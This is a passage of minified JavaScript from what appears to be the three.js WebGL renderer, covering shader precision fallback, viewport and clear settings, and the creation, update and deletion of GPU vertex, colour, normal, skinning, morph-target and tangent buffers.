w=c.getShaderPrecisionFormat(c.FRAGMENT_SHADER,c.MEDIUM_INT);var bl=c.getShaderPrecisionFormat(c.FRAGMENT_SHADER,c.LOW_INT);var bU=by.precision>0&&ao.precision>0;var bk=bS.precision>0&&bG.precision>0;if(l==="highp"&&!bU){if(bk){l="mediump";console.warn("WebGLRenderer: highp not supported, using mediump")}else{l="lowp";console.warn("WebGLRenderer: highp and mediump not supported, using lowp")}}if(l==="mediump"&&!bk){l="lowp";console.warn("WebGLRenderer: mediump not supported, using lowp")}this.getContext=function(){return c};this.supportsVertexTextures=function(){return aX};this.supportsFloatTextures=function(){return p};this.supportsStandardDerivatives=function(){return bf};this.supportsCompressedTextureS3TC=function(){return aG};this.getMaxAnisotropy=function(){return bD};this.getPrecision=function(){return l};this.setSize=function(b3,b2,b4){aZ.width=b3*this.devicePixelRatio;aZ.height=b2*this.devicePixelRatio;if(this.devicePixelRatio!==1&&b4!==false){aZ.style.width=b3+"px";aZ.style.height=b2+"px"}this.setViewport(0,0,aZ.width,aZ.height)};this.setViewport=function(b3,b5,b4,b2){a5=b3!==undefined?b3:0;a4=b5!==undefined?b5:0;bT=b4!==undefined?b4:aZ.width;aW=b2!==undefined?b2:aZ.height;c.viewport(a5,a4,bT,aW)};this.setScissor=function(b3,b5,b4,b2){c.scissor(b3,b5,b4,b2)};this.enableScissorTest=function(b2){b2?c.enable(c.SCISSOR_TEST):c.disable(c.SCISSOR_TEST)};this.setClearColor=function(b2,b3){bt.set(b2);W=b3!==undefined?b3:1;c.clearColor(bt.r,bt.g,bt.b,W)};this.setClearColorHex=function(b2,b3){console.warn("DEPRECATED: .setClearColorHex() is being removed. Use .setClearColor() instead.");this.setClearColor(b2,b3)};this.getClearColor=function(){return bt};this.getClearAlpha=function(){return W};this.clear=function(b2,b5,b3){var b4=0;if(b2===undefined||b2){b4|=c.COLOR_BUFFER_BIT}if(b5===undefined||b5){b4|=c.DEPTH_BUFFER_BIT}if(b3===undefined||b3){b4|=c.STENCIL_BUFFER_BIT}c.clear(b4)};this.clearTarget=function(b4,b2,b5,b3){this.setRenderTarget(b4);this.clear(b2,b5,b3)};this.addPostPlugin=function(b2){b2.init(this);this.renderPluginsPost.push(b2)};this.addPrePlugin=function(b2){b2.init(this);this.renderPluginsPre.push(b2)};this.updateShadowMap=function(b3,b2){an=null;k=-1;a=-1;bA=-1;D=-1;a3=-1;b1=true;bm=-1;m=-1;this.shadowMapPlugin.update(b3,b2)};function F(b2){b2.__webglVertexBuffer=c.createBuffer();b2.__webglColorBuffer=c.createBuffer();aP.info.memory.geometries++}function af(b2){b2.__webglVertexBuffer=c.createBuffer();b2.__webglColorBuffer=c.createBuffer();b2.__webglLineDistanceBuffer=c.createBuffer();aP.info.memory.geometries++}function ae(b2){b2.__webglVertexBuffer=c.createBuffer();b2.__webglColorBuffer=c.createBuffer();b2.__webglNormalBuffer=c.createBuffer();aP.info.memory.geometries++}function aF(b3){b3.__webglVertexBuffer=c.createBuffer();b3.__webglNormalBuffer=c.createBuffer();b3.__webglTangentBuffer=c.createBuffer();b3.__webglColorBuffer=c.createBuffer();b3.__webglUVBuffer=c.createBuffer();b3.__webglUV2Buffer=c.createBuffer();b3.__webglSkinIndicesBuffer=c.createBuffer();b3.__webglSkinWeightsBuffer=c.createBuffer();b3.__webglFaceBuffer=c.createBuffer();b3.__webglLineBuffer=c.createBuffer();var b2,b4;if(b3.numMorphTargets){b3.__webglMorphTargetsBuffers=[];for(b2=0,b4=b3.numMorphTargets;b2<b4;b2++){b3.__webglMorphTargetsBuffers.push(c.createBuffer())}}if(b3.numMorphNormals){b3.__webglMorphNormalsBuffers=[];for(b2=0,b4=b3.numMorphNormals;b2<b4;b2++){b3.__webglMorphNormalsBuffers.push(c.createBuffer())}}aP.info.memory.geometries++}var a0=function(b2){var b3=b2.target;b3.removeEventListener("dispose",a0);bW(b3);aP.info.memory.geometries--};var ai=function(b3){var b2=b3.target;b2.removeEventListener("dispose",ai);H(b2);aP.info.memory.textures--};var R=function(b2){var b3=b2.target;b3.removeEventListener("dispose",R);aD(b3);aP.info.memory.textures--};var bj=function(b3){var b2=b3.target;b2.removeEventListener("dispose",bj);Q(b2)};var bW=function(b5){b5.__webglInit=undefined;if(b5.__webglVertexBuffer!==undefined){c.deleteBuffer(b5.__webglVertexBuffer)}if(b5.__webglNormalBuffer!==undefined){c.deleteBuffer(b5.__webglNormalBuffer)}if(b5.__webglTangentBuffer!==undefined){c.deleteBuffer(b5.__webglTangentBuffer)}if(b5.__webglColorBuffer!==undefined){c.deleteBuffer(b5.__webglColorBuffer)}if(b5.__webglUVBuffer!==undefined){c.deleteBuffer(b5.__webglUVBuffer)}if(b5.__webglUV2Buffer!==undefined){c.deleteBuffer(b5.__webglUV2Buffer)}if(b5.__webglSkinIndicesBuffer!==undefined){c.deleteBuffer(b5.__webglSkinIndicesBuffer)}if(b5.__webglSkinWeightsBuffer!==undefined){c.deleteBuffer(b5.__webglSkinWeightsBuffer)}if(b5.__webglFaceBuffer!==undefined){c.deleteBuffer(b5.__webglFaceBuffer)}if(b5.__webglLineBuffer!==undefined){c.deleteBuffer(b5.__webglLineBuffer)}if(b5.__webglLineDistanceBuffer!==undefined){c.deleteBuffer(b5.__webglLineDistanceBuffer)}if(b5.geometryGroups!==undefined){for(var b4 in b5.geometryGroups){var b3=b5.geometryGroups[b4];if(b3.numMorphTargets!==undefined){for(var b2=0,b6=b3.numMorphTargets;b2<b6;b2++){c.deleteBuffer(b3.__webglMorphTargetsBuffers[b2])}}if(b3.numMorphNormals!==undefined){for(var b2=0,b6=b3.numMorphNormals;b2<b6;b2++){c.deleteBuffer(b3.__webglMorphNormalsBuffers[b2])}}ad(b3)}}ad(b5)};var H=function(b2){if(b2.image&&b2.image.__webglTextureCube){c.deleteTexture(b2.image.__webglTextureCube)}else{if(!b2.__webglInit){return}b2.__webglInit=false;c.deleteTexture(b2.__webglTexture)}};var aD=function(b3){if(!b3||!b3.__webglTexture){return}c.deleteTexture(b3.__webglTexture);if(b3 instanceof THREE.WebGLRenderTargetCube){for(var b2=0;b2<6;b2++){c.deleteFramebuffer(b3.__webglFramebuffer[b2]);c.deleteRenderbuffer(b3.__webglRenderbuffer[b2])}}else{c.deleteFramebuffer(b3.__webglFramebuffer);c.deleteRenderbuffer(b3.__webglRenderbuffer)}};var Q=function(b8){var b4=b8.program;if(b4===undefined){return}b8.program=undefined;var b5,b3,b7;var b6=false;for(b5=0,b3=bF.length;b5<b3;b5++){b7=bF[b5];if(b7.program===b4){b7.usedTimes--;if(b7.usedTimes===0){b6=true}break}}if(b6===true){var b2=[];for(b5=0,b3=bF.length;b5<b3;b5++){b7=bF[b5];if(b7.program!==b4){b2.push(b7)}}bF=b2;c.deleteProgram(b4);aP.info.memory.programs--}};function ad(b2){if(b2.__webglCustomAttributesList){for(var b3 in b2.__webglCustomAttributesList){c.deleteBuffer(b2.__webglCustomAttributesList[b3].buffer)}}}function bX(b8,b3){var b5=b8.vertices.length;var b6=b3.material;if(b6.attributes){if(b8.__webglCustomAttributesList===undefined){b8.__webglCustomAttributesList=[]}for(var b2 in b6.attributes){var b7=b6.attributes[b2];if(!b7.__webglInitialized||b7.createUniqueBuffers){b7.__webglInitialized=true;var b4=1;if(b7.type==="v2"){b4=2}else{if(b7.type==="v3"){b4=3}else{if(b7.type==="v4"){b4=4}else{if(b7.type==="c"){b4=3}}}}b7.size=b4;b7.array=new Float32Array(b5*b4);b7.buffer=c.createBuffer();b7.buffer.belongsToAttribute=b2;b7.needsUpdate=true}b8.__webglCustomAttributesList.push(b7)}}}function bL(b4,b2){var b3=b4.vertices.length;b4.__vertexArray=new Float32Array(b3*3);b4.__colorArray=new Float32Array(b3*3);b4.__sortArray=[];b4.__webglParticleCount=b3;bX(b4,b2)}function I(b4,b2){var b3=b4.vertices.length;b4.__vertexArray=new Float32Array(b3*3);b4.__colorArray=new Float32Array(b3*3);b4.__lineDistanceArray=new Float32Array(b3*1);b4.__webglLineCount=b3;bX(b4,b2)}function bV(b4,b2){var b3=b4.vertices.length;b4.__vertexArray=new Float32Array(b3*3);b4.__colorArray=new Float32Array(b3*3);b4.__normalArray=new Float32Array(b3*3);b4.__webglVertexCount=b3;bX(b4,b2)}function am(ca,cj){var b2=cj.geometry,ck=ca.faces3,ci=ca.faces4,cd=ck.length*3+ci.length*4,b5=ck.length*1+ci.length*2,b7=ck.length*3+ci.length*4,b4=J(cj,ca),b9=bv(b4),cb=aS(b4),cg=bN(b4);ca.__vertexArray=new Float32Array(cd*3);if(cb){ca.__normalArray=new Float32Array(cd*3)}if(b2.hasTangents){ca.__tangentArray=new Float32Array(cd*4)}if(cg){ca.__colorArray=new Float32Array(cd*3)}if(b9){if(b2.faceUvs.length>0||b2.faceVertexUvs.length>0){ca.__uvArray=new Float32Array(cd*2)}if(b2.faceUvs.length>1||b2.faceVertexUvs.length>1){ca.__uv2Array=new Float32Array(cd*2)}}if(cj.geometry.skinWeights.length&&cj.geometry.skinIndices.length){ca.__skinIndexArray=new Float32Array(cd*4);ca.__skinWeightArray=new Float32Array(cd*4)}ca.__faceArray=new Uint16Array(b5*3);ca.__lineArray=new Uint16Array(b7*2);var cc,cf;if(ca.numMorphTargets){ca.__morphTargetsArrays=[];for(cc=0,cf=ca.numMorphTargets;cc<cf;cc++){ca.__morphTargetsArrays.push(new Float32Array(cd*3))}}if(ca.numMorphNormals){ca.__morphNormalsArrays=[];for(cc=0,cf=ca.numMorphNormals;cc<cf;cc++){ca.__morphNormalsArrays.push(new Float32Array(cd*3))}}ca.__webglFaceCount=b5*3;ca.__webglLineCount=b7*2;if(b4.attributes){if(ca.__webglCustomAttributesList===undefined){ca.__webglCustomAttributesList=[]}for(var ch in b4.attributes){var ce=b4.attributes[ch];var b6={};for(var b3 in ce){b6[b3]=ce[b3]}if(!b6.__webglInitialized||b6.createUniqueBuffers){b6.__webglInitialized=true;var b8=1;if(b6.type==="v2"){b8=2}else{if(b6.type==="v3"){b8=3}else{if(b6.type==="v4"){b8=4}else{if(b6.type==="c"){b8=3}}}}b6.size=b8;b6.array=new Float32Array(cd*b8);b6.buffer=c.createBuffer();b6.buffer.belongsToAttribute=ch;ce.needsUpdate=true;b6.__original=ce}ca.__webglCustomAttributesList.push(b6)}}ca.__inittedArrays=true}function J(b3,b2){return b3.material instanceof THREE.MeshFaceMaterial?b3.material.materials[b2.materialIndex]:b3.material}function bC(b2){return b2&&b2.shading!==undefined&&b2.shading===THREE.SmoothShading}function aS(b2){if((b2 instanceof THREE.MeshBasicMaterial&&!b2.envMap)||b2 instanceof THREE.MeshDepthMaterial){return false}if(bC(b2)){return THREE.SmoothShading}else{return THREE.FlatShading}}function bN(b2){if(b2.vertexColors){return b2.vertexColors}return false}function bv(b2){if(b2.map||b2.lightMap||b2.bumpMap||b2.normalMap||b2.specularMap||b2 instanceof THREE.ShaderMaterial){return true}return false}function C(b5){var b2,b4,b3;for(b2 in b5.attributes){if(b2==="index"){b3=c.ELEMENT_ARRAY_BUFFER}else{b3=c.ARRAY_BUFFER}b4=b5.attributes[b2];b4.buffer=c.createBuffer();c.bindBuffer(b3,b4.buffer);c.bufferData(b3,b4.array,c.STATIC_DRAW)}}function a8(b3,cg,cu){var ce,cs,cq,b5,b8,cn,b6=b3.vertices,cr=b6.length,cb=b3.colors,b9=cb.length,cf=b3.__vertexArray,b2=b3.__colorArray,b4=b3.__sortArray,ck=b3.verticesNeedUpdate,b7=b3.elementsNeedUpdate,ch=b3.colorsNeedUpdate,cj=b3.__webglCustomAttributesList,co,cc,ct,ci,cd,cm,cp;if(cu.sortParticles){E.copy(a1);E.multiply(cu.matrixWorld);for(ce=0;ce<cr;ce++){cq=b6[ce];V.copy(cq);V.applyProjection(E);b4[ce]=[V.z,ce]}b4.sort(ab);for(ce=0;ce<cr;ce++){cq=b6[b4[ce][1]];b5=ce*3;cf[b5]=cq.x;cf[b5+1]=cq.y;cf[b5+2]=cq.z}for(cs=0;cs<b9;cs++){b5=cs*3;cn=cb[b4[cs][1]];b2[b5]=cn.r;b2[b5+1]=cn.g;b2[b5+2]=cn.b}if(cj){for(co=0,cc=cj.length;co<cc;co++){cp=cj[co];if(!(cp.boundTo===undefined||cp.boundTo==="vertices")){continue}b5=0;cd=cp.value.length;if(cp.size===1){for(ci=0;ci<cd;ci++){b8=b4[ci][1];cp.array[ci]=cp.value[b8]}}else{if(cp.size===2){for(ci=0;ci<cd;ci++){b8=b4[ci][1];cm=cp.value[b8];cp.array[b5]=cm.x;cp.array[b5+1]=cm.y;b5+=2}}else{if(cp.size===3){if(cp.type==="c"){for(ci=0;ci<cd;ci++){b8=b4[ci][1];cm=cp.value[b8];cp.array[b5]=cm.r;cp.array[b5+1]=cm.g;cp.array[b5+2]=cm.b;b5+=3}}else{for(ci=0;ci<cd;ci++){b8=b4[ci][1];cm=cp.value[b8];cp.array[b5]=cm.x;cp.array[b5+1]=cm.y;cp.array[b5+2]=cm.z;b5+=3}}}else{if(cp.size===4){for(ci=0;ci<cd;ci++){b8=b4[ci][1];cm=cp.value[b8];cp.array[b5]=cm.x;cp.array[b5+1]=cm.y;cp.array[b5+2]=cm.z;cp.array[b5+3]=cm.w;b5+=4}}}}}}}}else{if(ck){for(ce=0;ce<cr;ce++){cq=b6[ce];b5=ce*3;cf[b5]=cq.x;cf[b5+1]=cq.y;cf[b5+2]=cq.z}}if(ch){for(cs=0;cs<b9;cs++){cn=cb[cs];b5=cs*3;b2[b5]=cn.r;b2[b5+1]=cn.g;b2[b5+2]=cn.b}}if(cj){for(co=0,cc=cj.length;co<cc;co++){cp=cj[co];if(cp.needsUpdate&&(cp.boundTo===undefined||cp.boundTo==="vertices")){cd=cp.value.length;b5=0;if(cp.size===1){for(ci=0;ci<cd;ci++){cp.array[ci]=cp.value[ci]}}else{if(cp.size===2){for(ci=0;ci<cd;ci++){cm=cp.value[ci];cp.array[b5]=cm.x;cp.array[b5+1]=cm.y;b5+=2}}else{if(cp.size===3){if(cp.type==="c"){for(ci=0;ci<cd;ci++){cm=cp.value[ci];cp.array[b5]=cm.r;cp.array[b5+1]=cm.g;cp.array[b5+2]=cm.b;b5+=3}}else{for(ci=0;ci<cd;ci++){cm=cp.value[ci];cp.array[b5]=cm.x;cp.array[b5+1]=cm.y;cp.array[b5+2]=cm.z;b5+=3}}}else{if(cp.size===4){for(ci=0;ci<cd;ci++){cm=cp.value[ci];cp.array[b5]=cm.x;cp.array[b5+1]=cm.y;cp.array[b5+2]=cm.z;cp.array[b5+3]=cm.w;b5+=4}}}}}}}}}if(ck||cu.sortParticles){c.bindBuffer(c.ARRAY_BUFFER,b3.__webglVertexBuffer);c.bufferData(c.ARRAY_BUFFER,cf,cg)}if(ch||cu.sortParticles){c.bindBuffer(c.ARRAY_BUFFER,b3.__webglColorBuffer);c.bufferData(c.ARRAY_BUFFER,b2,cg)}if(cj){for(co=0,cc=cj.length;co<cc;co++){cp=cj[co];if(cp.needsUpdate||cu.sortParticles){c.bindBuffer(c.ARRAY_BUFFER,cp.buffer);c.bufferData(c.ARRAY_BUFFER,cp.array,cg)}}}}function bp(b5,cg){var cd,cu,cs,cr,b6,cn,b7=b5.vertices,b9=b5.colors,cf=b5.lineDistances,ct=b7.length,b8=b9.length,co=cf.length,ce=b5.__vertexArray,b4=b5.__colorArray,b2=b5.__lineDistanceArray,ck=b5.verticesNeedUpdate,ch=b5.colorsNeedUpdate,b3=b5.lineDistancesNeedUpdate,cj=b5.__webglCustomAttributesList,cp,cb,cv,ci,cc,cm,cq;if(ck){for(cd=0;cd<ct;cd++){cr=b7[cd];b6=cd*3;ce[b6]=cr.x;ce[b6+1]=cr.y;ce[b6+2]=cr.z}c.bindBuffer(c.ARRAY_BUFFER,b5.__webglVertexBuffer);c.bufferData(c.ARRAY_BUFFER,ce,cg)}if(ch){for(cu=0;cu<b8;cu++){cn=b9[cu];b6=cu*3;b4[b6]=cn.r;b4[b6+1]=cn.g;b4[b6+2]=cn.b}c.bindBuffer(c.ARRAY_BUFFER,b5.__webglColorBuffer);c.bufferData(c.ARRAY_BUFFER,b4,cg)}if(b3){for(cs=0;cs<co;cs++){b2[cs]=cf[cs]}c.bindBuffer(c.ARRAY_BUFFER,b5.__webglLineDistanceBuffer);c.bufferData(c.ARRAY_BUFFER,b2,cg)}if(cj){for(cp=0,cb=cj.length;cp<cb;cp++){cq=cj[cp];if(cq.needsUpdate&&(cq.boundTo===undefined||cq.boundTo==="vertices")){b6=0;cc=cq.value.length;if(cq.size===1){for(ci=0;ci<cc;ci++){cq.array[ci]=cq.value[ci]}}else{if(cq.size===2){for(ci=0;ci<cc;ci++){cm=cq.value[ci];cq.array[b6]=cm.x;cq.array[b6+1]=cm.y;b6+=2}}else{if(cq.size===3){if(cq.type==="c"){for(ci=0;ci<cc;ci++){cm=cq.value[ci];cq.array[b6]=cm.r;cq.array[b6+1]=cm.g;cq.array[b6+2]=cm.b;b6+=3}}else{for(ci=0;ci<cc;ci++){cm=cq.value[ci];cq.array[b6]=cm.x;cq.array[b6+1]=cm.y;cq.array[b6+2]=cm.z;b6+=3}}}else{if(cq.size===4){for(ci=0;ci<cc;ci++){cm=cq.value[ci];cq.array[b6]=cm.x;cq.array[b6+1]=cm.y;cq.array[b6+2]=cm.z;cq.array[b6+3]=cm.w;b6+=4}}}}}c.bindBuffer(c.ARRAY_BUFFER,cq.buffer);c.bufferData(c.ARRAY_BUFFER,cq.array,cg)}}}}function T(b4,cf){var cd,cu,cm,cq,b5,co,cv,cp,cb,ck,ce,cr,cn,b6=b4.vertices,b9=b4.colors,ch=b4.normals,ct=b6.length,b8=b9.length,b2=ch.length,cc=b4.__vertexArray,b3=b4.__colorArray,cs=b4.__normalArray,cj=b4.verticesNeedUpdate,cg=b4.colorsNeedUpdate,b7=b4.normalsNeedUpdate,ci=b4.__webglCustomAttributesList;if(cj){for(cd=0;cd<ct;cd++){cq=b6[cd];b5=cd*3;cc[b5]=cq.x;cc[b5+1]=cq.y;cc[b5+2]=cq.z}c.bindBuffer(c.ARRAY_BUFFER,b4.__webglVertexBuffer);c.bufferData(c.ARRAY_BUFFER,cc,cf)}if(cg){for(cu=0;cu<b8;cu++){co=b9[cu];b5=cu*3;b3[b5]=co.r;b3[b5+1]=co.g;b3[b5+2]=co.b}c.bindBuffer(c.ARRAY_BUFFER,b4.__webglColorBuffer);c.bufferData(c.ARRAY_BUFFER,b3,cf)}if(b7){for(cm=0;cm<b2;cm++){cv=ch[cm];b5=cm*3;cs[b5]=cv.x;cs[b5+1]=cv.y;cs[b5+2]=cv.z}c.bindBuffer(c.ARRAY_BUFFER,b4.__webglNormalBuffer);c.bufferData(c.ARRAY_BUFFER,cs,cf)}if(ci){for(cp=0,cb=ci.length;cp<cb;cp++){cr=ci[cp];if(cr.needsUpdate&&(cr.boundTo===undefined||cr.boundTo==="vertices")){b5=0;ce=cr.value.length;if(cr.size===1){for(ck=0;ck<ce;ck++){cr.array[ck]=cr.value[ck]}}else{if(cr.size===2){for(ck=0;ck<ce;ck++){cn=cr.value[ck];cr.array[b5]=cn.x;cr.array[b5+1]=cn.y;b5+=2}}else{if(cr.size===3){if(cr.type==="c"){for(ck=0;ck<ce;ck++){cn=cr.value[ck];cr.array[b5]=cn.r;cr.array[b5+1]=cn.g;cr.array[b5+2]=cn.b;b5+=3}}else{for(ck=0;ck<ce;ck++){cn=cr.value[ck];cr.array[b5]=cn.x;cr.array[b5+1]=cn.y;cr.array[b5+2]=cn.z;b5+=3}}}else{if(cr.size===4){for(ck=0;ck<ce;ck++){cn=cr.value[ck];cr.array[b5]=cn.x;cr.array[b5+1]=cn.y;cr.array[b5+2]=cn.z;cr.array[b5+3]=cn.w;b5+=4}}}}}c.bindBuffer(c.ARRAY_BUFFER,cr.buffer);c.bufferData(c.ARRAY_BUFFER,cr.array,cf)}}}}function q(dm,dt,dW,cg,dU){if(!dm.__inittedArrays){return}var cO=aS(dU),cd=bN(dU),dl=bv(dU),cD=(cO===THREE.SmoothShading);var cU,dF,dL,b3,ck,b8,cZ,cl,cN,b4,cM,dR,dc,db,da,c9,dS,dQ,dO,dM,dK,dH,dG,dE,dj,di,dg,df,dA,dz,dw,dv,cc,cb,ca,b9,cJ,cH,cG,cF,cr,cp,cn,cm,cQ,dq,cT,cL,cw,de,dk,cx,cE,cP,dh,cV,dd,cY,ct=0,ci=0,dp=0,dP=0,cR=0,cC=0,cj=0,c8=0,ch=0,cS=0,b2=0,ce=0,co=0,cI,b7=dm.__vertexArray,cB=dm.__uvArray,cf=dm.__uv2Array,du=dm.__normalArray,dy=dm.__tangentArray,c5=dm.__colorArray,ds=dm.__skinIndexArray,dJ=dm.__skinWeightArray,dI=dm.__morphTargetsArrays,cy=dm.__morphNormalsArrays,cA=dm.__webglCustomAttributesList,b6,dN=dm.__faceArray,cX=dm.__lineArray,dn=dt.geometry,cv=dn.verticesNeedUpdate,cW=dn.elementsNeedUpdate,c6=dn.uvsNeedUpdate,b5=dn.normalsNeedUpdate,dT=dn.tangentsNeedUpdate,dx=dn.colorsNeedUpdate,dX=dn.morphTargetsNeedUpdate,c7=dn.vertices,cs=dm.faces3,cq=dm.faces4,dB=dn.faces,c0=dn.faceVertexUvs[0],cz=dn.faceVertexUvs[1],dC=dn.colors,cK=dn.skinIndices,dD=dn.skinWeights,dV=dn.morphTargets,dr=dn.morphNormals;if(cv){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];dc=c7[b3.a];db=c7[b3.b];da=c7[b3.c];b7[ci]=dc.x;b7[ci+1]=dc.y;b7[ci+2]=dc.z;b7[ci+3]=db.x;b7[ci+4]=db.y;b7[ci+5]=db.z;b7[ci+6]=da.x;b7[ci+7]=da.y;b7[ci+8]=da.z;ci+=9}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];dc=c7[b3.a];db=c7[b3.b];da=c7[b3.c];c9=c7[b3.d];b7[ci]=dc.x;b7[ci+1]=dc.y;b7[ci+2]=dc.z;b7[ci+3]=db.x;b7[ci+4]=db.y;b7[ci+5]=db.z;b7[ci+6]=da.x;b7[ci+7]=da.y;b7[ci+8]=da.z;b7[ci+9]=c9.x;b7[ci+10]=c9.y;b7[ci+11]=c9.z;ci+=12}c.bindBuffer(c.ARRAY_BUFFER,dm.__webglVertexBuffer);c.bufferData(c.ARRAY_BUFFER,b7,dW)}if(dX){for(cx=0,cE=dV.length;cx<cE;cx++){b2=0;for(cU=0,dF=cs.length;cU<dF;cU++){cV=cs[cU];b3=dB[cV];dc=dV[cx].vertices[b3.a];db=dV[cx].vertices[b3.b];da=dV[cx].vertices[b3.c];cP=dI[cx];cP[b2]=dc.x;cP[b2+1]=dc.y;cP[b2+2]=dc.z;cP[b2+3]=db.x;cP[b2+4]=db.y;cP[b2+5]=db.z;cP[b2+6]=da.x;cP[b2+7]=da.y;cP[b2+8]=da.z;if(dU.morphNormals){if(cD){dd=dr[cx].vertexNormals[cV];dK=dd.a;dH=dd.b;dG=dd.c}else{dK=dr[cx].faceNormals[cV];dH=dK;dG=dK}dh=cy[cx];dh[b2]=dK.x;dh[b2+1]=dK.y;dh[b2+2]=dK.z;dh[b2+3]=dH.x;dh[b2+4]=dH.y;dh[b2+5]=dH.z;dh[b2+6]=dG.x;dh[b2+7]=dG.y;dh[b2+8]=dG.z}b2+=9}for(cU=0,dF=cq.length;cU<dF;cU++){cV=cq[cU];b3=dB[cV];dc=dV[cx].vertices[b3.a];db=dV[cx].vertices[b3.b];da=dV[cx].vertices[b3.c];c9=dV[cx].vertices[b3.d];cP=dI[cx];cP[b2]=dc.x;cP[b2+1]=dc.y;cP[b2+2]=dc.z;cP[b2+3]=db.x;cP[b2+4]=db.y;cP[b2+5]=db.z;cP[b2+6]=da.x;cP[b2+7]=da.y;cP[b2+8]=da.z;cP[b2+9]=c9.x;cP[b2+10]=c9.y;cP[b2+11]=c9.z;if(dU.morphNormals){if(cD){dd=dr[cx].vertexNormals[cV];dK=dd.a;dH=dd.b;dG=dd.c;dE=dd.d}else{dK=dr[cx].faceNormals[cV];dH=dK;dG=dK;dE=dK}dh=cy[cx];dh[b2]=dK.x;dh[b2+1]=dK.y;dh[b2+2]=dK.z;dh[b2+3]=dH.x;dh[b2+4]=dH.y;dh[b2+5]=dH.z;dh[b2+6]=dG.x;dh[b2+7]=dG.y;dh[b2+8]=dG.z;dh[b2+9]=dE.x;dh[b2+10]=dE.y;dh[b2+11]=dE.z}b2+=12}c.bindBuffer(c.ARRAY_BUFFER,dm.__webglMorphTargetsBuffers[cx]);c.bufferData(c.ARRAY_BUFFER,dI[cx],dW);if(dU.morphNormals){c.bindBuffer(c.ARRAY_BUFFER,dm.__webglMorphNormalsBuffers[cx]);c.bufferData(c.ARRAY_BUFFER,cy[cx],dW)}}}if(dD.length){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];dA=dD[b3.a];dz=dD[b3.b];dw=dD[b3.c];dJ[cS]=dA.x;dJ[cS+1]=dA.y;dJ[cS+2]=dA.z;dJ[cS+3]=dA.w;dJ[cS+4]=dz.x;dJ[cS+5]=dz.y;dJ[cS+6]=dz.z;dJ[cS+7]=dz.w;dJ[cS+8]=dw.x;dJ[cS+9]=dw.y;dJ[cS+10]=dw.z;dJ[cS+11]=dw.w;cc=cK[b3.a];cb=cK[b3.b];ca=cK[b3.c];ds[cS]=cc.x;ds[cS+1]=cc.y;ds[cS+2]=cc.z;ds[cS+3]=cc.w;ds[cS+4]=cb.x;ds[cS+5]=cb.y;ds[cS+6]=cb.z;ds[cS+7]=cb.w;ds[cS+8]=ca.x;ds[cS+9]=ca.y;ds[cS+10]=ca.z;ds[cS+11]=ca.w;cS+=12}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];dA=dD[b3.a];dz=dD[b3.b];dw=dD[b3.c];dv=dD[b3.d];dJ[cS]=dA.x;dJ[cS+1]=dA.y;dJ[cS+2]=dA.z;dJ[cS+3]=dA.w;dJ[cS+4]=dz.x;dJ[cS+5]=dz.y;dJ[cS+6]=dz.z;dJ[cS+7]=dz.w;dJ[cS+8]=dw.x;dJ[cS+9]=dw.y;dJ[cS+10]=dw.z;dJ[cS+11]=dw.w;dJ[cS+12]=dv.x;dJ[cS+13]=dv.y;dJ[cS+14]=dv.z;dJ[cS+15]=dv.w;cc=cK[b3.a];cb=cK[b3.b];ca=cK[b3.c];b9=cK[b3.d];ds[cS]=cc.x;ds[cS+1]=cc.y;ds[cS+2]=cc.z;ds[cS+3]=cc.w;ds[cS+4]=cb.x;ds[cS+5]=cb.y;ds[cS+6]=cb.z;ds[cS+7]=cb.w;ds[cS+8]=ca.x;ds[cS+9]=ca.y;ds[cS+10]=ca.z;ds[cS+11]=ca.w;ds[cS+12]=b9.x;ds[cS+13]=b9.y;ds[cS+14]=b9.z;ds[cS+15]=b9.w;cS+=16}if(cS>0){c.bindBuffer(c.ARRAY_BUFFER,dm.__webglSkinIndicesBuffer);c.bufferData(c.ARRAY_BUFFER,ds,dW);c.bindBuffer(c.ARRAY_BUFFER,dm.__webglSkinWeightsBuffer);c.bufferData(c.ARRAY_BUFFER,dJ,dW)}}if(dx&&cd){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];cl=b3.vertexColors;cN=b3.color;if(cl.length===3&&cd===THREE.VertexColors){dj=cl[0];di=cl[1];dg=cl[2]}else{dj=cN;di=cN;dg=cN}c5[ch]=dj.r;c5[ch+1]=dj.g;c5[ch+2]=dj.b;c5[ch+3]=di.r;c5[ch+4]=di.g;c5[ch+5]=di.b;c5[ch+6]=dg.r;c5[ch+7]=dg.g;c5[ch+8]=dg.b;ch+=9}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];cl=b3.vertexColors;cN=b3.color;if(cl.length===4&&cd===THREE.VertexColors){dj=cl[0];di=cl[1];dg=cl[2];df=cl[3]}else{dj=cN;di=cN;dg=cN;df=cN}c5[ch]=dj.r;c5[ch+1]=dj.g;c5[ch+2]=dj.b;c5[ch+3]=di.r;c5[ch+4]=di.g;c5[ch+5]=di.b;c5[ch+6]=dg.r;c5[ch+7]=dg.g;c5[ch+8]=dg.b;c5[ch+9]=df.r;c5[ch+10]=df.g;c5[ch+11]=df.b;ch+=12}if(ch>0){c.bindBuffer(c.ARRAY_BUFFER,dm.__webglColorBuffer);c.bufferData(c.ARRAY_BUFFER,c5,dW)}}if(dT&&dn.hasTangents){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];b4=b3.vertexTangents;dS=b4[0];dQ=b4[1];dO=b4[2];dy[cj]=dS.x;dy[cj+1]=dS.y;dy[cj+2]=dS.z;dy[cj+3]=dS.w;dy[cj+4]=dQ.x;dy[cj+5]=dQ.y;dy[cj+6]=dQ.z;dy[cj+7]=dQ.w;dy[cj+8]=dO.x;dy[cj+9]=dO.y;dy[cj+10]=dO.z;dy[cj+11]=dO.w;cj+=12}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];b4=b3.vertexTangents;dS=b4[0];dQ=b4[1];dO=b4[2];dM=b4[3];dy[cj]=dS.x;dy[cj+1]=dS.y;dy[cj+2]=dS.z;dy[cj+3]=dS.w;dy[cj+4]=dQ.x;dy[cj+5]=dQ.y;dy[cj+6]=dQ.z;dy[cj+7]=dQ.w;dy[cj+8]=dO.x;dy[cj+9]=dO.y;dy[cj+10]=dO.z;dy[cj+11]=dO.w;dy[cj+12]=dM.x;dy[cj+13]=dM.y;dy[cj+14]=dM.z;dy[cj+15]=dM.w;cj+=16}c.bindBuffer(c.ARRAY_BUFFER,dm.__webglTangentBuffer);c.bufferData(c.ARRAY_BUFFER,dy,